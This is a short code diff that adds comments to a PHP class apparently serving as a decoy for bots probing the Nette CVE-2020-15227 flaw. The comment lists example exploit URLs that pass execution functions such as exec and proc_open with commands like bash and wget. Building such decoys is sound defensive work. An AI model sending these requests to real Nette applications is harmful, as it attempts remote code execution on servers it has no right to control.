@@ -7,6 +7,13 @@ use Nette\Application\BadRequestException;
 
 /**
  * Nette CVE-2020-15227, here to easter-egg some bots
+ *
+ * Example URLs:
+ * - https://www.michalspacek.cz/nette.micro?callback=exec&command=ifconfig
+ * - https://www.michalspacek.cz/nette.micro?callback=passthru&command=ls
+ * - https://www.michalspacek.cz/nette.micro?callback=proc_open&cmd=bash
+ * - https://www.michalspacek.cz/nette.micro?callback=shell_exec&cmd=certutil
+ * - https://www.michalspacek.cz/nette.micro?callback=pcntl_exec&path=wget
  */
 class NetteCve202015227
 {
